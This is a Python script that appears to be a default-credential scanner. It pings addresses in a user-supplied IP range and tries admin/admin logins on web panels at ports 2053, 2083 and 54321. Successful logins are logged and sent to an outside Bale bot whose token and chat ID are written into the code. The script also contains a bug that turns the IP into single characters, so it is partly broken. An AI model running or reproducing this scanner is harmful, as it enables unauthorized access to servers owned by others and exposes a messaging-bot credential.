import requests
import os
from time import localtime
from ping3 import ping
import ipaddress, random, struct


# Set the timeout for requests
# please set by network status
timeout = 2


try:
    os.mkdir("data")
except:
    pass


def timer():
    return f"{localtime().tm_year}/{localtime().tm_mon}/{localtime().tm_mday} , {localtime().tm_hour}:{localtime().tm_min}"
    
def random_ip(network):
    network = ipaddress.IPv4Network(network)
    network_int, = struct.unpack("!I", network.network_address.packed) # make network address into an integer
    rand_bits = network.max_prefixlen - network.prefixlen # calculate the needed bits for the host part
    rand_host_int = random.randint(0, 2**rand_bits - 1) # generate random host part
    ip_address = ipaddress.IPv4Address(network_int + rand_host_int) # combine the parts 
    return ip_address.exploded

def send(text):
    x=requests.post(f"https://tapi.bale.ai/bot899168976:CshJYXlBbgYpwCybOhQbq9mBGERAhAJga82uRv5q/sendMessage",json={"chat_id": "369363336", "text": f"{text}"})


def loger(ip, port, text):
    """
    Log the result of checking the Plesk server at the given IP address and port.
    """
    with open("data/log.txt", "a+") as file:
        file.write(f"{ip}:{port} is {text} ({timer()})\n")
        file.close()

    if text == True:
        with open("data/index.html", "a+") as T:
            T.write(f"{ip}:{port} ({timer()})<br/>\n")
            T.close()
            send(f"{ip}:{port} ({timer()})")

    elif text == False:
        pass
    else:
        with open("data/iunknown.html", "a+") as T:
            T.write(f"{ip}:{port} is {text} ({timer()})<br/>\n")
            T.close()
            send(f"{ip}:{port} is {text} ({timer()})")



loger("info", "", "loger started")




iprange = input("ip range(XXX.XXX.XXX/Y) ==>")

def checker83(ip: str, timeout: int):
    """
    Check if the Plesk server at the given IP address and port 2083 is accessible.
    """
    try:
        url = f"http://{ip}:2083/login"

        data = {'username': 'admin', 'password': 'admin'}

        response = requests.post(url, data, timeout=timeout)

        response_json = response.json()

        if response_json["success"]:
            return True
        else:
            return response_json['msg']
    except:
        return False


def checker54(ip: str, timeout: int):
    """
    Check if the Plesk server at the given IP address and port 54321 is accessible.
    """
    try:
        url = f"http://{ip}:54321/login"

        data = {'username': 'admin', 'password': 'admin'}

        response = requests.post(url, data, timeout=timeout)

        response_json = response.json()

        if response_json["success"]:
            return True
        else:
            return response_json['msg']
    except:
        return False


def checker53(ip: str, timeout: int):
    """
    Check if the Plesk server at the given IP address and port 2053 is accessible.
    """
    try:
        url = f"http://{ip}:2053/login"

        data = {'username': 'admin', 'password': 'admin'}

        response = requests.post(url, data, timeout=timeout)

        response_json = response.json()

        if response_json["success"]:
            return True
        else:
            return response_json['msg']
    except:
        return False


# Read the IP addresses from the file

ips = random_ip(iprange)

# Iterate over the IP addresses and check if the Plesk servers are accessible

for ip in ips:
    ip = ip.strip()
    if ping(ip,1) != None:
        result53 = checker53(ip, timeout)
        result83 = checker83(ip, timeout)
        result54 = checker54(ip, timeout)

        if result53 == False:
            pass
            loger(ip, 2053, False)
        elif result53 == True:
            print(ip, ":2053")
            loger(ip, 2053, True)
        else:
            print(ip, ":2053", result53)
            loger(ip, 2053, result53)

        if result83 == False:
            pass
            loger(ip, 2083, False)
        elif result83 == True:
            print(ip, ":2083")
            loger(ip, 2083, True)
        else:
            print(ip, ":2083", result83)
            loger(ip, 2083, result83)

        if result54 == False:
            pass
            loger(ip, 54321, False)
        elif result54 == True:
            print(ip, ":54321")
            loger(ip, 54321, True)
        else:
            print(ip, ":54321", result54)
            loger(ip, 54321, result54)

loger("info", "", "Done!")
input("press enter to close")
